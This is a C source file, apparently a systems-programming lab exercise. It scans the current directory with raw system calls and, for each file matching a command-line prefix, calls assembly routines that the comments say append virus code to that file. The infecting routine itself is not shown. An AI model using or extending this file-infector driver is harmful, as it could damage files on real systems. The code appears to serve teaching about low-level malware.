#include "Util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define O_RDONLY 0
#define SYS_SEEK 19
#define SEEK_SET 0

#define SYS_GETDENTS 141
#define BUF_SIZE 8192

/* External assembly functions defined in start.s */
extern int system_call();
extern void infection(void);
extern void infector(char *);

/* Helper functions from Util.c (assumed to be in Util.h) */
/* strlen, strncmp, itoa, etc. */

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
};

int main (int argc , char* argv[], char* envp[])
{
    int fd;
    int nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int bpos;
    char d_type;
    char *prefix = 0;
    int i;

    system_call(SYS_WRITE, STDOUT, "Start Task 2\n", 13);

    /* Check for -a<prefix> argument */
    for (i = 1; i < argc; i++)
    {
        if (argv[i][0] == '-' && argv[i][1] == 'a')
        {
            prefix = argv[i] + 2; /* Point to the characters after "-a" */
        }
    }

    /* Open current directory (".") */
    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0644);
    if (fd < 0)
    {
        system_call(SYS_WRITE, STDOUT, "Error opening directory\n", 24);
        return 0x55;
    }

    /* Loop over directory entries using sys_getdents */
    while (1)
    {
        nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
        if (nread == -1)
        {
            system_call(SYS_WRITE, STDOUT, "Error reading directory\n", 24);
            return 0x55;
        }
        if (nread == 0)
            break; /* End of directory */

        for (bpos = 0; bpos < nread;)
        {
            d = (struct linux_dirent *) (buf + bpos);
            
            /* The last byte in the record is the type, but standard defines might differ.
               We mostly care about the name here. */
            
            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));

            /* Check if we need to attach the virus */
            if (prefix && strncmp(d->d_name, prefix, strlen(prefix)) == 0)
            {
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
                
                infection();         /* Print the infection message */
                infector(d->d_name); /* Append the virus code to the file */
            }
            
            system_call(SYS_WRITE, STDOUT, "\n", 1);
            
            /* Move to the next entry */
            bpos += d->d_reclen;
        }
    }

    /* Close the directory file descriptor */
    system_call(6, fd);

    return 0;
}